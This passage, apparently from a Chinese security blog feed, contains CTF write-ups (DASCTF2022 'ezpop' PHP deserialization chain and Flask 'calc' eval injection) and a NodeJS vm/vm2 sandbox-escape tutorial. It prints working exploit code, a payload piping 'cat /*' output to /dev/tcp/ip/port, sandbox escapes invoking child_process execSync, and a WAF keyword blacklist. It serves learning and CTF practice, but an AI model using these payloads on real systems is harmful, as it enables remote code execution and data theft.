src="/2022/03/26/DASCTF2022-Web/image-20220328192110803.png" alt="image-20220328192110803"></p><p>然后查看SUID命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www-data@out:/$ find . -perm /4000</span><br></pre></td></tr></table></figure><p>发现可用nl命令来获得flag</p><p><img src="/2022/03/26/DASCTF2022-Web/image-20220328193811887.png" alt="image-20220328193811887"></p><p>参考wp：<a href="https://erroratao.github.io/writeup/DASCTF2022xSU/">https://erroratao.github.io/writeup/DASCTF2022xSU/</a></p><h1 id="ezpop"><a href="#ezpop" class="headerlink" title="ezpop"></a>ezpop</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">crow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">eval</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">new</span> <span class="keyword">$this</span>-&gt;v1(<span class="keyword">$this</span>-&gt;v2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;v1-&gt;world();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fin</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$f1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;f1 . <span class="string">&#x27;114514&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="keyword">$this</span>-&gt;f1)();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;f1-&gt;get_flag();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">what</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a-&gt;run();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mix</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$m1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="keyword">$this</span>-&gt;m1)();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;#&#x27;</span> . <span class="keyword">$this</span>-&gt;m1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">    unserialize(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>构造pop链：</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">fin</span>-&gt;</span>__<span class="function"><span class="title">destruct</span>() =&gt; what-&gt;</span>__<span class="function"><span class="title">tostring</span>() =&gt; fin-&gt;</span><span class="function"><span class="title">run</span>() =&gt; crow-&gt;</span>__<span class="function"><span class="title">invoke</span>() =&gt; fin-&gt;</span>__<span class="function"><span class="title">call</span>() =&gt; mix-&gt;</span>get_flag()</span><br></pre></td></tr></table></figure><p>exp:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$fin1</span> = <span class="keyword">new</span> fin();</span><br><span class="line"><span class="variable">$fin2</span> = <span class="keyword">new</span> fin();</span><br><span class="line"><span class="variable">$fin3</span> = <span class="keyword">new</span> fin();</span><br><span class="line"><span class="variable">$crow</span> = <span class="keyword">new</span> crow();</span><br><span class="line"><span class="variable">$what</span> = <span class="keyword">new</span> what();</span><br><span class="line"><span class="variable">$mix</span>  = <span class="keyword">new</span> mix();</span><br><span class="line"></span><br><span class="line"><span class="variable">$mix</span>-&gt;m1 = <span class="string">&quot;\r\nsystem(&#x27;cat ./*&#x27;);&quot;</span>; <span class="comment">//注释符换行绕过</span></span><br><span class="line"><span class="variable">$fin3</span>-&gt;f1 = <span class="variable">$mix</span>;</span><br><span class="line"><span class="variable">$crow</span>-&gt;v1 = <span class="variable">$fin3</span>;</span><br><span class="line"><span class="variable">$fin2</span>-&gt;f1 = <span class="variable">$crow</span>;</span><br><span class="line"><span class="variable">$what</span>-&gt;a = <span class="variable">$fin2</span>;</span><br><span class="line"><span class="variable">$fin1</span>-&gt;f1 = <span class="variable">$what</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$fin1</span>));</span><br></pre></td></tr></table></figure><h1 id="calc"><a href="#calc" class="headerlink" title="calc"></a>calc</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,render_template,url_for,render_template_string,redirect,request,current_app,session,abort,send_from_directory</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> secure_filename</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app=Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span>(<span class="params">s</span>):</span></span><br><span class="line">    blacklist = [<span class="string">&#x27;import&#x27;</span>,<span class="string">&#x27;(&#x27;</span>,<span class="string">&#x27;)&#x27;</span>,<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;|&#x27;</span>,<span class="string">&#x27;;&#x27;</span>,<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;&#123;&#x27;</span>,<span class="string">&#x27;&#125;&#x27;</span>,<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;getattr&#x27;</span>,<span class="string">&#x27;os&#x27;</span>,<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;class&#x27;</span>,<span class="string">&#x27;subclasses&#x27;</span>,<span class="string">&#x27;mro&#x27;</span>,<span class="string">&#x27;request&#x27;</span>,<span class="string">&#x27;args&#x27;</span>,<span class="string">&#x27;eval&#x27;</span>,<span class="string">&#x27;if&#x27;</span>,<span class="string">&#x27;subprocess&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;open&#x27;</span>,<span class="string">&#x27;popen&#x27;</span>,<span class="string">&#x27;builtins&#x27;</span>,<span class="string">&#x27;compile&#x27;</span>,<span class="string">&#x27;execfile&#x27;</span>,<span class="string">&#x27;from_pyfile&#x27;</span>,<span class="string">&#x27;config&#x27;</span>,<span class="string">&#x27;local&#x27;</span>,<span class="string">&#x27;self&#x27;</span>,<span class="string">&#x27;item&#x27;</span>,<span class="string">&#x27;getitem&#x27;</span>,<span class="string">&#x27;getattribute&#x27;</span>,<span class="string">&#x27;func_globals&#x27;</span>,<span class="string">&#x27;__init__&#x27;</span>,<span class="string">&#x27;join&#x27;</span>,<span class="string">&#x27;__dict__&#x27;</span>]</span><br><span class="line">    flag = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> no <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> no.lower() <span class="keyword">in</span> s.lower():</span><br><span class="line">            flag= <span class="literal">False</span></span><br><span class="line">            <span class="built_in">print</span>(no)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="string">&quot;欢迎来到SUctf2022&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/calc&quot;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc</span>():</span></span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    num = request.values.get(<span class="string">&quot;num&quot;</span>)</span><br><span class="line">    log = <span class="string">&quot;echo &#123;0&#125; &#123;1&#125; &#123;2&#125;&gt; ./tmp/log.txt&quot;</span>.<span class="built_in">format</span>(time.strftime(<span class="string">&quot;%Y%m%d-%H%M%S&quot;</span>,time.localtime()),ip,num)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> waf(num):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = <span class="built_in">eval</span>(num)</span><br><span class="line">            os.system(log)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span>(data)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;waf!!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">5000</span>)  </span><br></pre></td></tr></table></figure><p>waf没有过滤反引号，用反引号执行命令，因此需要绕过<code>eval()</code>，可以注释绕过，waf把空格过滤了，可以制表符绕过，最后还有一个<code>&lt;</code>用来闭合</p><p>payload:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>#<span class="string">`cat/*`</span>&gt;<span class="regexp">/dev/</span>tcp/ip/port&lt;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;upgdstore&quot;&gt;&lt;a href=&quot;#upgdstore&quot; class=&quot;headerlink&quot; title=&quot;upgdstore&quot;&gt;&lt;/a&gt;upgdstore&lt;/h1&gt;&lt;p&gt;先上传文件读源码&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>NodeJS沙盒逃逸</title>
    <link href="https://wuyusanhua2021.github.io/2022/03/15/NodeJS%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8/"/>
    <id>https://wuyusanhua2021.github.io/2022/03/15/NodeJS%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8/</id>
    <published>2022-03-15T04:11:06.000Z</published>
    <updated>2022-03-20T11:54:09.056Z</updated>
    
    <content type="html"><![CDATA[<h1 id="vm模块"><a href="#vm模块" class="headerlink" title="vm模块"></a>vm模块</h1><p>node.js 里提供了 vm 模块，相当于一个虚拟机，可以让你在执行代码时候隔离当前的执行环境，避免被恶意代码攻击。<code>vm</code> 模块可在 V8 虚拟机上下文中编译和运行代码。 注意的是：<code>vm</code> 模块不是安全的机制。 不要使用它来运行不受信任的代码。</p><p>官方文档原话：</p><blockquote><p>一个常见的用例是在不同的 V8 上下文中运行代码。 这意味着被调用的代码与调用的代码具有不同的全局对象。</p><p>可以通过使对象<a href="http://nodejs.cn/api/vm.html#vm_what_does_it_mean_to_contextify_an_object">上下文隔离化</a>来提供上下文。 被调用的代码将上下文中的任何属性都视为全局变量。 由调用的代码引起的对全局变量的任何更改都将会反映在上下文对象中。</p></blockquote><p>调用vm模块的例子如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> x = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">const</span> context = &#123; <span class="attr">x</span>: <span class="number">2</span> &#125;;</span><br><span class="line">vm.createContext(context); <span class="comment">// 创建上下文隔离化对象。</span></span><br><span class="line"><span class="keyword">const</span> code = <span class="string">&#x27;x += 40; var y = 17;&#x27;</span>;</span><br><span class="line"><span class="comment">// `x` and `y` 是上下文中的全局变量。</span></span><br><span class="line"><span class="comment">// 最初，x 的值为 2，因为这是 context.x 的值。</span></span><br><span class="line">vm.runInContext(code, context);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(context.x); <span class="comment">// 42</span></span><br><span class="line"><span class="built_in">console</span>.log(context.y); <span class="comment">// 17</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(x); <span class="comment">// 1; y 没有定义。</span></span><br></pre></td></tr></table></figure><p>官方文档有：</p><blockquote><p>在 V8 中，一个上下文是一个执行环境，它允许分离的，无关的 JavaScript 应用在一个 V8 的单例中被运行。 必须明确地指定用于运行所有 JavaScript 代码的上下文。</p></blockquote><p><code>vm.createContext()</code> 有一个 <code>contextobject</code> 参数，用于接收一个对象（如果没有，就在模块内部创建一个），而创建一个 context（对象） 然后传入 <code>contextObject</code> 作为代码执行环境的过程被称作语境化（contextify）</p><p>沙盒执行上下文是隔离的，但可通过原型链的方式获取到沙盒外的Function，从而完成逃逸，拿到全局数据</p><p>官方示例：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&quot;vm&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> ctx = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">vm.runInNewContext(<span class="string">&#x27;this.constructor.constructor(&quot;return process&quot;)().exit()&#x27;</span>,ctx);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;Never gets executed.&quot;</span>);</span><br></pre></td></tr></table></figure><p>上例在<code>vm.runInNewContext()</code>中的代码具体执行的过程为：</p><p>先获取ctx的构造函数<code>Object.constructor</code>，再获取这个构造函数的构造函数<code>Function.constructor</code>，并且利用<code>Function.constructor</code>构造了一个恶意函数，本例中的作用就是获取主线程的process全局变量，并调用process.exit()造成主程序非正常退出</p><p>实际应用经常用来打任意命令执行：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&quot;vm&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> env = vm.runInNewContext(<span class="string">`const process = this.constructor.constructor(&#x27;return this.process&#x27;)(); process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;whoami&#x27;).toString()`</span>);</span><br><span class="line"><span class="built_in">console</span>.log(env); <span class="comment">//调用了child_progress</span></span><br></pre></td></tr></table></figure><h1 id="vm2模块"><a href="#vm2模块" class="headerlink" title="vm2模块"></a>vm2模块</h1><p>vm2是一个第三方模块，基于vm模块、Proxy特性、require重写来实现，能提供隔离程度更高的沙箱</p><p>较于vm模块，vm2把context中的所有对象都语境化了，因此不能通过<code>this.constructor.constructor</code>来获取外部的Function</p><p>在vm2模块中的逃逸可以借助异常处理机制<code>try catch</code>，主进程try抛出异常，然后再catch捕获Error对象，通过这个error对象引用到 <code>process</code>，示例如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> &#123;VM&#125; = <span class="built_in">require</span>(<span class="string">&#x27;vm2&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> untrusted = <span class="string">`var process;</span></span><br><span class="line"><span class="string">try &#123;</span></span><br><span class="line"><span class="string">    let a = Buffer.from(&quot;&quot;)</span></span><br><span class="line"><span class="string">    Object.defineProperty(a, &quot;&quot;, &#123;</span></span><br><span class="line"><span class="string">        get set() &#123;</span></span><br><span class="line"><span class="string">            Object.defineProperty(Object.prototype, &quot;get&quot;, &#123;</span></span><br><span class="line"><span class="string">                get: function get() &#123;</span></span><br><span class="line"><span class="string">                    throw function (x) &#123;</span></span><br><span class="line"><span class="string">                        return x.constructor(&quot;return process&quot;)();</span></span><br><span class="line"><span class="string">                    &#125;;</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">            &#125;);</span></span><br><span class="line"><span class="string">            return ()=&gt;&#123;&#125;;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;);</span></span><br><span class="line"><span class="string">&#125; catch (e) &#123;</span></span><br><span class="line"><span class="string">    process = e(() =&gt; &#123;&#125;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">process.mainModule.require(&quot;child_process&quot;).execSync(&quot;id&quot;).toString();`</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">new</span> VM().run(untrusted));</span><br><span class="line">&#125;<span class="keyword">catch</span>(x)&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关于vm2逃逸具体原理挺长的，这两篇文章<a href="https://www.anquanke.com/post/id/207283">vm2实现原理分析</a>和<a href="https://www.anquanke.com/post/id/207291">vm2沙箱逃逸分析</a>，把vm2的相关源码梳理了一遍，写的很详细</p><p>vm2逃逸的payload大全，各种版本都有：</p><p><a href="https://github.com/patriksimek/vm2/issues?q=breakout">https://github.com/patriksimek/vm2/issues?q=breakout</a></p><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="HFCTF2020-JustEscape"><a href="#HFCTF2020-JustEscape" class="headerlink" title="[HFCTF2020]JustEscape"></a>[HFCTF2020]JustEscape</h2><p>在run.php里用<code>Error().stack</code>探一下，得到报错信息</p><p><img src="/2022/03/15/NodeJS%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8/image-20220318225540108.png" alt="image-20220318225540108"></p><p>基本可以确定是vm2逃逸，测试了一下，prototype，constructor等关键词被过滤，<code>反引号 + $&#123;&#125;</code>可绕过，最终可以用v3.8.3的payload打</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">TypeError</span>[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`prototyp`</span>&#125;</span>e`</span>&#125;</span>`</span>][<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`get_pro`</span>&#125;</span>cess`</span>&#125;</span>`</span>] = <span class="function"><span class="params">f</span>=&gt;</span>f[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`constructo`</span>&#125;</span>r`</span>&#125;</span>`</span>](<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`return proc`</span>&#125;</span>ess`</span>&#125;</span>`</span>)();</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="built_in">Object</span>.preventExtensions(Buffer.from(<span class="string">``</span>)).a = <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">catch</span>(e)&#123;</span><br><span class="line">        <span class="keyword">return</span> e[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`get_pro`</span>&#125;</span>cess`</span>&#125;</span>`</span>](<span class="function">()=&gt;</span>&#123;&#125;).mainModule[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`requir`</span>&#125;</span>e`</span>&#125;</span>`</span>](<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`child_proces`</span>&#125;</span>s`</span>&#125;</span>`</span>)[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`exe`</span>&#125;</span>cSync`</span>&#125;</span>`</span>](<span class="string">`cat /flag`</span>).toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure><h2 id="GKCTF2020-EZ三剑客-EzNode"><a href="#GKCTF2020-EZ三剑客-EzNode" class="headerlink" title="[GKCTF2020]EZ三剑客-EzNode"></a>[GKCTF2020]EZ三剑客-EzNode</h2><p>去<code>/version</code>路由，可以看到本题是用的v1.3.6的safer-eval模块，存在逃逸漏洞</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;src&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;version&quot;</span>: <span class="string">&quot;1.0.0&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;main&quot;</span>: <span class="string">&quot;index.js&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;license&quot;</span>: <span class="string">&quot;MIT&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;dependencies&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;body-parser&quot;</span>: <span class="string">&quot;1.19.0&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;express&quot;</span>: <span class="string">&quot;4.17.1&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;safer-eval&quot;</span>: <span class="string">&quot;1.3.6&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后去<code>/source</code>路由看源码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span 